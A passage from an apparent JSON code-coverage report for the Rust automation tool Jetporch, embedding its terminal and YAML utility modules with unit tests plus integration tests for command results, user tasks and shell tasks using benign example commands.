tools\n}","traces":[{"line":25,"address":[],"length":0,"stats":{"Line":8}},{"line":26,"address":[],"length":0,"stats":{"Line":8}},{"line":27,"address":[],"length":0,"stats":{"Line":18}},{"line":33,"address":[],"length":0,"stats":{"Line":4}},{"line":35,"address":[],"length":0,"stats":{"Line":4}},{"line":36,"address":[],"length":0,"stats":{"Line":12}},{"line":37,"address":[],"length":0,"stats":{"Line":10}},{"line":39,"address":[],"length":0,"stats":{"Line":2}},{"line":43,"address":[],"length":0,"stats":{"Line":8}},{"line":44,"address":[],"length":0,"stats":{"Line":8}},{"line":45,"address":[],"length":0,"stats":{"Line":20}},{"line":49,"address":[],"length":0,"stats":{"Line":4}},{"line":50,"address":[],"length":0,"stats":{"Line":8}},{"line":54,"address":[],"length":0,"stats":{"Line":2}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":4}},{"line":64,"address":[],"length":0,"stats":{"Line":4}},{"line":68,"address":[],"length":0,"stats":{"Line":2}},{"line":69,"address":[],"length":0,"stats":{"Line":2}},{"line":72,"address":[],"length":0,"stats":{"Line":4}},{"line":73,"address":[],"length":0,"stats":{"Line":4}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":10}},{"line":83,"address":[],"length":0,"stats":{"Line":18}},{"line":84,"address":[],"length":0,"stats":{"Line":2}},{"line":88,"address":[],"length":0,"stats":{"Line":2}},{"line":90,"address":[],"length":0,"stats":{"Line":6}},{"line":91,"address":[],"length":0,"stats":{"Line":6}},{"line":92,"address":[],"length":0,"stats":{"Line":4}},{"line":94,"address":[],"length":0,"stats":{"Line":2}}],"covered":28,"coverable":33},{"path":["/","Users","wings","projects","jetpack","src","util","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\npub mod io;\npub mod yaml;\npub mod terminal;\n","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","util","terminal.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\npub fn markdown_print(markdown: \u0026String) {\n    termimad::print_text(markdown);\n}\n\npub fn banner(msg: \u0026String) {\n    let markdown = String::from(format!(\"|:-|\\n\\\n                                        |{}|\\n\\\n                                        |-\", msg));\n    markdown_print(\u0026markdown);\n}\n\npub fn two_column_table(header_a: \u0026String, header_b: \u0026String, elements: \u0026Vec\u003c(String,String)\u003e) {\n    let mut buffer = String::from(\"|:-|:-\\n\");\n    buffer.push_str(\n        \u0026String::from(format!(\"|{}|{}\\n\", header_a, header_b))\n    );\n    for (a,b) in elements.iter() {\n        buffer.push_str(\u0026String::from(\"|-|-\\n\"));\n        buffer.push_str(\n            \u0026String::from(format!(\"|{}|{}\\n\", a, b))\n        );\n    }\n    buffer.push_str(\u0026String::from(\"|-|-\\n\"));\n    markdown_print(\u0026buffer);\n}\n\npub fn captioned_display(caption: \u0026String, body: \u0026String) {\n    banner(caption);\n    println!(\"\");\n    for line in body.lines() {\n        println!(\"    {}\", line);\n    }\n    println!(\"\");\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_markdown_print() {\n        // Just verify it doesn't panic\n        let markdown = String::from(\"# Test Heading\\n\\nSome **bold** text\");\n        markdown_print(\u0026markdown);\n    }\n\n    #[test]\n    fn test_banner() {\n        // Just verify it doesn't panic\n        let msg = String::from(\"Test Banner Message\");\n        banner(\u0026msg);\n    }\n\n    #[test]\n    fn test_two_column_table() {\n        let header_a = String::from(\"Column A\");\n        let header_b = String::from(\"Column B\");\n        let elements = vec![\n            (String::from(\"Row 1 A\"), String::from(\"Row 1 B\")),\n            (String::from(\"Row 2 A\"), String::from(\"Row 2 B\")),\n            (String::from(\"Row 3 A\"), String::from(\"Row 3 B\")),\n        ];\n        \n        // Just verify it doesn't panic\n        two_column_table(\u0026header_a, \u0026header_b, \u0026elements);\n    }\n\n    #[test]\n    fn test_two_column_table_empty() {\n        let header_a = String::from(\"Empty A\");\n        let header_b = String::from(\"Empty B\");\n        let elements: Vec\u003c(String, String)\u003e = vec![];\n        \n        // Should handle empty tables gracefully\n        two_column_table(\u0026header_a, \u0026header_b, \u0026elements);\n    }\n\n    #[test]\n    fn test_captioned_display() {\n        let caption = String::from(\"Test Caption\");\n        let body = String::from(\"Line 1\\nLine 2\\nLine 3\");\n        \n        // Just verify it doesn't panic\n        captioned_display(\u0026caption, \u0026body);\n    }\n\n    #[test]\n    fn test_captioned_display_multiline() {\n        let caption = String::from(\"Multi-line Display\");\n        let body = String::from(\"First line\\n    Indented line\\n\\nEmpty line above\\nLast line\");\n        \n        // Test with various line formats\n        captioned_display(\u0026caption, \u0026body);\n    }\n\n    #[test]\n    fn test_captioned_display_empty_body() {\n        let caption = String::from(\"Empty Body Test\");\n        let body = String::from(\"\");\n        \n        // Should handle empty body gracefully\n        captioned_display(\u0026caption, \u0026body);\n    }\n}","traces":[{"line":17,"address":[],"length":0,"stats":{"Line":32}},{"line":18,"address":[],"length":0,"stats":{"Line":32}},{"line":21,"address":[],"length":0,"stats":{"Line":18}},{"line":22,"address":[],"length":0,"stats":{"Line":18}},{"line":23,"address":[],"length":0,"stats":{"Line":18}},{"line":24,"address":[],"length":0,"stats":{"Line":18}},{"line":25,"address":[],"length":0,"stats":{"Line":18}},{"line":28,"address":[],"length":0,"stats":{"Line":4}},{"line":29,"address":[],"length":0,"stats":{"Line":4}},{"line":30,"address":[],"length":0,"stats":{"Line":4}},{"line":31,"address":[],"length":0,"stats":{"Line":4}},{"line":33,"address":[],"length":0,"stats":{"Line":16}},{"line":34,"address":[],"length":0,"stats":{"Line":6}},{"line":35,"address":[],"length":0,"stats":{"Line":6}},{"line":36,"address":[],"length":0,"stats":{"Line":6}},{"line":39,"address":[],"length":0,"stats":{"Line":4}},{"line":40,"address":[],"length":0,"stats":{"Line":4}},{"line":43,"address":[],"length":0,"stats":{"Line":6}},{"line":44,"address":[],"length":0,"stats":{"Line":6}},{"line":45,"address":[],"length":0,"stats":{"Line":6}},{"line":46,"address":[],"length":0,"stats":{"Line":38}},{"line":47,"address":[],"length":0,"stats":{"Line":16}},{"line":49,"address":[],"length":0,"stats":{"Line":6}}],"covered":23,"coverable":23},{"path":["/","Users","wings","projects","jetpack","src","util","yaml.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse std::path::Path;\nuse std::fs::read_to_string;\nuse crate::util::terminal::banner;\n\nconst YAML_ERROR_SHOW_LINES:usize = 10;\nconst YAML_ERROR_WIDTH:usize = 180; // things will wrap in terminal anyway\n\n// ==============================================================================================================\n// PUBLIC API\n// ==============================================================================================================\n\npub fn show_yaml_error_in_context(yaml_error: \u0026serde_yaml::Error, path: \u0026Path) {\n\n    println!(\"\");\n\n    let location = yaml_error.location();\n    let mut yaml_error_str = String::from(format!(\"{}\", yaml_error));\n\n    yaml_error_str.truncate(YAML_ERROR_WIDTH);\n    if yaml_error_str.len() \u003e YAML_ERROR_WIDTH - 3 {\n        yaml_error_str.push_str(\"...\");\n    }\n\n    if location.is_none() {\n        let markdown_table = format!(\"|:-|\\n\\\n                                      |Error reading YAML file: {}|\\n\\\n                                      |{}|\\n\\\n                                      |-\", path.display(), yaml_error_str);\n        crate::util::terminal::markdown_print(\u0026markdown_table);\n        return;\n    }\n\n    // get the line/column info out of the location object\n    let location = location.unwrap();\n    let error_line = location.line();\n    let error_column = location.column();\n\n    let lines: Vec\u003cString\u003e = read_to_string(path).unwrap().lines().map(String::from).collect();\n    let line_count = lines.len();\n\n    banner(\u0026format!(\"Error reading YAML file: {}, {}\", path.display(), yaml_error_str).to_string());\n\n    let show_start: usize;\n    let mut show_stop : usize = error_line + YAML_ERROR_SHOW_LINES;\n    \n    if error_line \u003c YAML_ERROR_SHOW_LINES {\n        show_start = 0; \n    } else {\n        show_start = error_line - YAML_ERROR_SHOW_LINES;\n    }\n\n    if show_stop \u003e line_count {\n        show_stop = line_count;\n    }\n\n    println!(\"\");\n\n    let mut count: usize = 0;\n\n    for line in lines.iter() {\n        count = count + 1;\n        if count \u003e= show_start \u0026\u0026 count \u003c= show_stop {\n            if count ==  error_line {\n                println!(\"     {count:5}:{error_column:5} | \u003e\u003e\u003e | {}\", line);\n            } else {\n                println!(\"     {count:5}       |     | {}\", line);\n            }\n        }\n    }\n\n    println!(\"\");\n\n}\n\npub fn blend_variables(a: \u0026mut serde_yaml::Value, b: serde_yaml::Value) {\n\n    match (a, b) {\n\n        (_a @ \u0026mut serde_yaml::Value::Mapping(_), serde_yaml::Value::Null) =\u003e {\n        },\n\n        (a @ \u0026mut serde_yaml::Value::Mapping(_), serde_yaml::Value::Mapping(b)) =\u003e {\n            let a = a.as_mapping_mut().unwrap();\n            for (k, v) in b {\n                if v.is_sequence() \u0026\u0026 a.contains_key(\u0026k) \u0026\u0026 a[\u0026k].is_sequence() {\n                    let mut _b = a.get(\u0026k).unwrap().as_sequence().unwrap().to_owned();\n                    _b.append(\u0026mut v.as_sequence().unwrap().to_owned());\n                    a[\u0026k] = serde_yaml::Value::from(_b);\n                    continue;\n                }\n                if !a.contains_key(\u0026k) {\n                    a.insert(k.to_owned(), v.to_owned());\n                }\n                else {\n                    blend_variables(\u0026mut a[\u0026k], v);\n                }\n\n            }\n        }\n        (a, b) =\u003e {\n            *a = b\n        },\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::fs::{self, File};\n    use std::io::Write;\n    use tempfile::TempDir;\n\n    #[test]\n    fn test_blend_variables_null_into_mapping() {\n        let mut a = serde_yaml::from_str(\"key: value\").unwrap();\n        let b = serde_yaml::Value::Null;\n        \n        blend_variables(\u0026mut a, b);\n        \n        assert_eq!(a[\"key\"], \"value\");\n    }\n\n    #[test]\n    fn test_blend_variables_mapping_into_mapping() {\n        let mut a = serde_yaml::from_str(\"key1: value1\").unwrap();\n        let b = serde_yaml::from_str(\"key2: value2\").unwrap();\n        \n        blend_variables(\u0026mut a, b);\n        \n        assert_eq!(a[\"key1\"], \"value1\");\n        assert_eq!(a[\"key2\"], \"value2\");\n    }\n\n    #[test]\n    fn test_blend_variables_override_value() {\n        let mut a = serde_yaml::from_str(\"key: old_value\").unwrap();\n        let b = serde_yaml::from_str(\"key: new_value\").unwrap();\n        \n        blend_variables(\u0026mut a, b);\n        \n        assert_eq!(a[\"key\"], \"new_value\");\n    }\n\n    #[test]\n    fn test_blend_variables_merge_sequences() {\n        let mut a = serde_yaml::from_str(\"list: [1, 2]\").unwrap();\n        let b = serde_yaml::from_str(\"list: [3, 4]\").unwrap();\n        \n        blend_variables(\u0026mut a, b);\n        \n        let list = a[\"list\"].as_sequence().unwrap();\n        assert_eq!(list.len(), 4);\n        assert_eq!(list[0], 1);\n        assert_eq!(list[1], 2);\n        assert_eq!(list[2], 3);\n        assert_eq!(list[3], 4);\n    }\n\n    #[test]\n    fn test_blend_variables_nested_mappings() {\n        let mut a = serde_yaml::from_str(\"\nparent:\n  child1: value1\n\").unwrap();\n        let b = serde_yaml::from_str(\"\nparent:\n  child2: value2\n\").unwrap();\n        \n        blend_variables(\u0026mut a, b);\n        \n        assert_eq!(a[\"parent\"][\"child1\"], \"value1\");\n        assert_eq!(a[\"parent\"][\"child2\"], \"value2\");\n    }\n\n    #[test]\n    fn test_blend_variables_replace_non_mapping() {\n        // When 'a' is a non-mapping, it gets completely replaced by 'b'\n        let mut a = serde_yaml::Value::String(\"original\".to_string());\n        let b = serde_yaml::from_str(\"key: value\").unwrap();\n        \n        blend_variables(\u0026mut a, b);\n        \n        // 'a' should now be the mapping from 'b'\n        assert!(a.is_mapping());\n        assert_eq!(a[\"key\"], \"value\");\n    }\n\n    #[test]\n    fn test_show_yaml_error_without_location() {\n        let temp_dir = TempDir::new().unwrap();\n        let file_path = temp_dir.path().join(\"test.yaml\");\n        let mut file = File::create(\u0026file_path).unwrap();\n        writeln!(file, \"invalid: yaml: content\").unwrap();\n        \n        // Create a YAML error without location info\n        let yaml_content = \"invalid: yaml: content\";\n        let error = serde_yaml::from_str::\u003cserde_yaml::Value\u003e(yaml_content).unwrap_err();\n        \n        // This should not panic\n        show_yaml_error_in_context(\u0026error, \u0026file_path);\n    }\n\n    #[test]\n    fn test_show_yaml_error_with_location() {\n        let temp_dir = TempDir::new().unwrap();\n        let file_path = temp_dir.path().join(\"test.yaml\");\n        let mut file = File::create(\u0026file_path).unwrap();\n        \n        // Write a file with multiple lines\n        for i in 1..25 {\n            writeln!(file, \"line{}: value{}\", i, i).unwrap();\n        }\n        writeln!(file, \"invalid: [unclosed\").unwrap();\n        \n        // Try to parse the invalid file\n        let content = fs::read_to_string(\u0026file_path).unwrap();\n        let error = serde_yaml::from_str::\u003cserde_yaml::Value\u003e(\u0026content).unwrap_err();\n        \n        // This should not panic and should show context\n        show_yaml_error_in_context(\u0026error, \u0026file_path);\n    }\n\n    #[test]\n    fn test_show_yaml_error_near_start() {\n        let temp_dir = TempDir::new().unwrap();\n        let file_path = temp_dir.path().join(\"test.yaml\");\n        let mut file = File::create(\u0026file_path).unwrap();\n        \n        writeln!(file, \"invalid: [unclosed\").unwrap();\n        writeln!(file, \"line2: value2\").unwrap();\n        writeln!(file, \"line3: value3\").unwrap();\n        \n        let content = fs::read_to_string(\u0026file_path).unwrap();\n        let error = serde_yaml::from_str::\u003cserde_yaml::Value\u003e(\u0026content).unwrap_err();\n        \n        // This should handle edge case where error is near start\n        show_yaml_error_in_context(\u0026error, \u0026file_path);\n    }\n\n    #[test]\n    fn test_show_yaml_error_near_end() {\n        let temp_dir = TempDir::new().unwrap();\n        let file_path = temp_dir.path().join(\"test.yaml\");\n        let mut file = File::create(\u0026file_path).unwrap();\n        \n        writeln!(file, \"line1: value1\").unwrap();\n        writeln!(file, \"line2: value2\").unwrap();\n        writeln!(file, \"invalid: [unclosed\").unwrap();\n        \n        let content = fs::read_to_string(\u0026file_path).unwrap();\n        let error = serde_yaml::from_str::\u003cserde_yaml::Value\u003e(\u0026content).unwrap_err();\n        \n        // This should handle edge case where error is near end\n        show_yaml_error_in_context(\u0026error, \u0026file_path);\n    }\n\n    #[test]\n    fn test_show_yaml_error_truncation() {\n        let temp_dir = TempDir::new().unwrap();\n        let file_path = temp_dir.path().join(\"test.yaml\");\n        let mut file = File::create(\u0026file_path).unwrap();\n        \n        // Create invalid YAML that will generate a long error message\n        let long_content = \"a\".repeat(200);\n        writeln!(file, \"key: [{}unclosed\", long_content).unwrap();\n        \n        let content = fs::read_to_string(\u0026file_path).unwrap();\n        let error = serde_yaml::from_str::\u003cserde_yaml::Value\u003e(\u0026content).unwrap_err();\n        \n        // This should truncate long error messages - just verify it doesn't panic\n        show_yaml_error_in_context(\u0026error, \u0026file_path);\n    }\n}\n","traces":[{"line":28,"address":[],"length":0,"stats":{"Line":10}},{"line":30,"address":[],"length":0,"stats":{"Line":10}},{"line":32,"address":[],"length":0,"stats":{"Line":10}},{"line":33,"address":[],"length":0,"stats":{"Line":10}},{"line":35,"address":[],"length":0,"stats":{"Line":10}},{"line":36,"address":[],"length":0,"stats":{"Line":10}},{"line":37,"address":[],"length":0,"stats":{"Line":0}},{"line":40,"address":[],"length":0,"stats":{"Line":10}},{"line":41,"address":[],"length":0,"stats":{"Line":0}},{"line":44,"address":[],"length":0,"stats":{"Line":0}},{"line":45,"address":[],"length":0,"stats":{"Line":0}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":10}},{"line":51,"address":[],"length":0,"stats":{"Line":10}},{"line":52,"address":[],"length":0,"stats":{"Line":10}},{"line":54,"address":[],"length":0,"stats":{"Line":10}},{"line":55,"address":[],"length":0,"stats":{"Line":10}},{"line":57,"address":[],"length":0,"stats":{"Line":10}},{"line":59,"address":[],"length":0,"stats":{"Line":10}},{"line":60,"address":[],"length":0,"stats":{"Line":10}},{"line":62,"address":[],"length":0,"stats":{"Line":18}},{"line":63,"address":[],"length":0,"stats":{"Line":8}},{"line":65,"address":[],"length":0,"stats":{"Line":2}},{"line":68,"address":[],"length":0,"stats":{"Line":10}},{"line":69,"address":[],"length":0,"stats":{"Line":10}},{"line":76,"address":[],"length":0,"stats":{"Line":66}},{"line":77,"address":[],"length":0,"stats":{"Line":66}},{"line":78,"address":[],"length":0,"stats":{"Line":102}},{"line":79,"address":[],"length":0,"stats":{"Line":40}},{"line":80,"address":[],"length":0,"stats":{"Line":4}},{"line":82,"address":[],"length":0,"stats":{"Line":32}},{"line":87,"address":[],"length":0,"stats":{"Line":10}},{"line":91,"address":[],"length":0,"stats":{"Line":46}},{"line":93,"address":[],"length":0,"stats":{"Line":46}},{"line":95,"address":[],"length":0,"stats":{"Line":2}},{"line":98,"address":[],"length":0,"stats":{"Line":34}},{"line":99,"address":[],"length":0,"stats":{"Line":34}},{"line":100,"address":[],"length":0,"stats":{"Line":118}},{"line":101,"address":[],"length":0,"stats":{"Line":4}},{"line":102,"address":[],"length":0,"stats":{"Line":2}},{"line":103,"address":[],"length":0,"stats":{"Line":2}},{"line":104,"address":[],"length":0,"stats":{"Line":2}},{"line":105,"address":[],"length":0,"stats":{"Line":2}},{"line":107,"address":[],"length":0,"stats":{"Line":70}},{"line":108,"address":[],"length":0,"stats":{"Line":30}},{"line":110,"address":[],"length":0,"stats":{"Line":10}},{"line":111,"address":[],"length":0,"stats":{"Line":10}},{"line":116,"address":[],"length":0,"stats":{"Line":10}},{"line":117,"address":[],"length":0,"stats":{"Line":10}}],"covered":44,"coverable":49},{"path":["/","Users","wings","projects","jetpack","tests","connection","command.rs"],"content":"use jetpack::connection::command::*;\nuse jetpack::tasks::response::{TaskResponse, TaskStatus};\nuse jetpack::tasks::fields::Field;\nuse std::sync::Arc;\n\n#[test]\nfn test_command_result_creation() {\n    let cmd_result = CommandResult {\n        cmd: \"ls -la\".to_string(),\n        out: \"file1\\nfile2\\n\".to_string(),\n        rc: 0,\n    };\n    \n    assert_eq!(cmd_result.cmd, \"ls -la\");\n    assert_eq!(cmd_result.out, \"file1\\nfile2\\n\");\n    assert_eq!(cmd_result.rc, 0);\n}\n\n#[test]\nfn test_command_result_clone() {\n    let cmd_result = CommandResult {\n        cmd: \"echo test\".to_string(),\n        out: \"test\\n\".to_string(),\n        rc: 0,\n    };\n    \n    let cloned = cmd_result.clone();\n    assert_eq!(cloned.cmd, cmd_result.cmd);\n    assert_eq!(cloned.out, cmd_result.out);\n    assert_eq!(cloned.rc, cmd_result.rc);\n}\n\n#[test]\nfn test_forward_enum() {\n    assert_eq!(Forward::Yes, Forward::Yes);\n    assert_eq!(Forward::No, Forward::No);\n    assert_ne!(Forward::Yes, Forward::No);\n}\n\n#[test]\nfn test_cmd_info() {\n    let response = TaskResponse {\n        status: TaskStatus::IsExecuted,\n        changes: vec![],\n        msg: None,\n        command_result: Arc::new(Some(CommandResult {\n            cmd: \"test command\".to_string(),\n            out: \"output text\".to_string(),\n            rc: 0,\n        })),\n        with: Arc::new(None),\n        and: Arc::new(None),\n    };\n    \n    let arc_response = Arc::new(response);\n    let (rc, out) = cmd_info(\u0026arc_response);\n    \n    assert_eq!(rc, 0);\n    assert_eq!(out, \"output text\");\n}\n\n#[test]\nfn test_cmd_info_with_error() {\n    let response = TaskResponse {\n        status: TaskStatus::Failed,\n        changes: vec![],\n        msg: Some(\"Command failed\".to_string()),\n        command_result: Arc::new(Some(CommandResult {\n            cmd: \"failing command\".to_string(),\n            out: \"error message\".to_string(),\n            rc: 1,\n        })),\n        with: Arc::new(None),\n        and: Arc::new(None),\n    };\n    \n    let arc_response = Arc::new(response);\n    let (rc, out) = cmd_info(\u0026arc_response);\n    \n    assert_eq!(rc, 1);\n    assert_eq!(out, \"error message\");\n}\n\n#[test]\n#[should_panic(expected = \"called cmd_info on a response that is not a command result\")]\nfn test_cmd_info_without_command_result() {\n    let response = TaskResponse {\n        status: TaskStatus::IsPassive,\n        changes: vec![],\n        msg: None,\n        command_result: Arc::new(None),\n        with: Arc::new(None),\n        and: Arc::new(None),\n    };\n    \n    let arc_response = Arc::new(response);\n    cmd_info(\u0026arc_response);\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","connection","mod.rs"],"content":"mod command;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","handle","handle.rs"],"content":"","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","handle","mod.rs"],"content":"mod handle;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","integration_tests.rs"],"content":"mod tasks;\nmod connection;\nmod playbooks;\nmod handle;\nmod registry;\nmod util;\nmod modules;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","access","mod.rs"],"content":"mod user;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","access","user.rs"],"content":"use jetpack::modules::access::user::*;\nuse jetpack::tasks::*;\nuse std::collections::HashSet;\n\n#[test]\nfn test_user_task_basic() {\n    let task = UserTask {\n        name: Some(\"Create deploy user\".to_string()),\n        user: \"deploy\".to_string(),\n        uid: None,\n        system: None,\n        gid: None,\n        groups: None,\n        append: None,\n        create_home: None,\n        create_user_group: None,\n        gecos: None,\n        shell: None,\n        remove: None,\n        cleanup: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"user\");\n    assert_eq!(task.get_name(), Some(\"Create deploy user\".to_string()));\n    assert_eq!(task.user, \"deploy\");\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_user_task_with_details() {\n    let mut groups = HashSet::new();\n    groups.insert(\"wheel\".to_string());\n    groups.insert(\"docker\".to_string());\n\n    let task = UserTask {\n        name: None,\n        user: \"webuser\".to_string(),\n        uid: Some(\"1001\".to_string()),\n        system: Some(\"no\".to_string()),\n        gid: Some(\"1001\".to_string()),\n        groups: Some(groups),\n        append: Some(\"yes\".to_string()),\n        create_home: Some(\"yes\".to_string()),\n        create_user_group: Some(\"yes\".to_string()),\n        gecos: Some(\"Web Application User\".to_string()),\n        shell: Some(\"/bin/bash\".to_string()),\n        remove: None,\n        cleanup: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"user\");\n    assert_eq!(task.uid, Some(\"1001\".to_string()));\n    assert!(task.groups.is_some());\n    let groups = task.groups.unwrap();\n    assert!(groups.contains(\"wheel\"));\n    assert!(groups.contains(\"docker\"));\n}\n\n#[test]\nfn test_user_task_system_user() {\n    let task = UserTask {\n        name: Some(\"Create system user\".to_string()),\n        user: \"prometheus\".to_string(),\n        uid: None,\n        system: Some(\"yes\".to_string()),\n        gid: None,\n        groups: None,\n        append: None,\n        create_home: Some(\"no\".to_string()),\n        create_user_group: Some(\"yes\".to_string()),\n        gecos: None,\n        shell: Some(\"/usr/sbin/nologin\".to_string()),\n        remove: None,\n        cleanup: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.system, Some(\"yes\".to_string()));\n    assert_eq!(task.create_home, Some(\"no\".to_string()));\n    assert_eq!(task.shell, Some(\"/usr/sbin/nologin\".to_string()));\n}\n\n#[test]\nfn test_user_task_remove() {\n    let task = UserTask {\n        name: Some(\"Remove user\".to_string()),\n        user: \"tempuser\".to_string(),\n        uid: None,\n        system: None,\n        gid: None,\n        groups: None,\n        append: None,\n        create_home: None,\n        create_user_group: None,\n        gecos: None,\n        shell: None,\n        remove: Some(\"yes\".to_string()),\n        cleanup: None,\n        with: None,\n        and: None,\n    };\n\n    assert!(task.remove.is_some());\n    assert_eq!(task.remove.unwrap(), \"yes\");\n}\n\n#[test]\nfn test_user_task_deserialization() {\n    let yaml = r#\"\nname: Create application user\nuser: appuser\nuid: \"2001\"\ngroups: [\"app\", \"logs\"]\nappend: \"yes\"\nshell: /bin/bash\ngecos: \"Application User\"\n\"#;\n\n    let task: Result\u003cUserTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Create application user\".to_string()));\n    assert_eq!(task.user, \"appuser\");\n    assert_eq!(task.uid, Some(\"2001\".to_string()));\n    assert!(task.groups.is_some());\n    assert_eq!(task.shell, Some(\"/bin/bash\".to_string()));\n}\n\n#[test]\nfn test_user_task_deserialization_minimal() {\n    let yaml = r#\"\nuser: testuser\n\"#;\n\n    let task: Result\u003cUserTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.user, \"testuser\");\n    assert!(task.name.is_none());\n    assert!(task.uid.is_none());\n}\n\n#[test]\nfn test_user_task_with_logic() {\n    let yaml = r#\"\nuser: \"{{ username }}\"\ngroups: [\"sudo\", \"{{ app_group }}\"]\nwith:\n  condition: \"{{ create_users }}\"\nand:\n  notify: \"user_created\"\n\"#;\n\n    let task: Result\u003cUserTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert!(task.user.contains(\"{{ username }}\"));\n    assert!(task.with.is_some());\n    assert!(task.and.is_some());\n}","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","commands","mod.rs"],"content":"mod shell;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","tests","modules","commands","shell.rs"],"content":"use jetpack::modules::commands::shell::*;\nuse jetpack::tasks::*;\n\n#[test]\nfn test_shell_task_basic() {\n    let task = ShellTask {\n        name: Some(\"Run command\".to_string()),\n        cmd: \"echo 'Hello World'\".to_string(),\n        save: None,\n        failed_when: None,\n        changed_when: None,\n        unsafe_: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"Shell\");\n    assert_eq!(task.get_name(), Some(\"Run command\".to_string()));\n    assert_eq!(task.cmd, \"echo 'Hello World'\");\n    assert!(task.get_with().is_none());\n}\n\n#[test]\nfn test_shell_task_with_save() {\n    let task = ShellTask {\n        name: None,\n        cmd: \"hostname -f\".to_string(),\n        save: Some(\"hostname_result\".to_string()),\n        failed_when: None,\n        changed_when: None,\n        unsafe_: None,\n        with: None,\n        and: None,\n    };\n\n    assert_eq!(task.get_module(), \"Shell\");\n    assert!(task.save.is_some());\n    assert_eq!(task.save.unwrap(), \"hostname_result\");\n}\n\n#[test]\nfn test_shell_task_with_conditions() {\n    let task = ShellTask {\n        name: Some(\"Check service\".to_string()),\n        cmd: \"systemctl status nginx\".to_string(),\n        save: None,\n        failed_when: Some(\"rc != 0 and rc != 3\".to_string()),\n        changed_when: Some(\"false\".to_string()),\n        unsafe_: None,\n        with: None,\n        and: None,\n    };\n\n    assert!(task.failed_when.is_some());\n    assert!(task.changed_when.is_some());\n}\n\n#[test]\nfn test_shell_task_unsafe() {\n    let task = ShellTask {\n        name: Some(\"Run unsafe command\".to_string()),\n        cmd: \"rm -rf /tmp/test || true\".to_string(),\n        save: None,\n        failed_when: None,\n        changed_when: None,\n        unsafe_: Some(\"yes\".to_string()),\n        with: None,\n        and: None,\n    };\n\n    assert!(task.unsafe_.is_some());\n    assert_eq!(task.unsafe_.unwrap(), \"yes\");\n}\n\n#[test]\nfn test_shell_task_deserialization() {\n    let yaml = r#\"\nname: Create directory\ncmd: mkdir -p /opt/myapp/logs\nchanged_when: \"false\"\nfailed_when: \"rc != 0\"\n\"#;\n\n    let task: Result\u003cShellTask, _\u003e = serde_yaml::from_str(yaml);\n    assert!(task.is_ok());\n    \n    let task = task.unwrap();\n    assert_eq!(task.name, Some(\"Create directory\".to_string()));\n    assert_eq!(task.cmd, \"mkdir -p /opt/myapp/logs\");\n    assert_eq!(task.changed_when, Some(\"false\".to_string()));\n    assert_eq!(task.failed_when, Some(\"rc != 0\".to_string()));\n}\n\n#[test]\nfn test_shell_task_deserialization_minimal() {\n    let yaml = r#\"\ncmd: date\n\"#;\n\n    let task: Result\u003cShellTask, _\u003e = 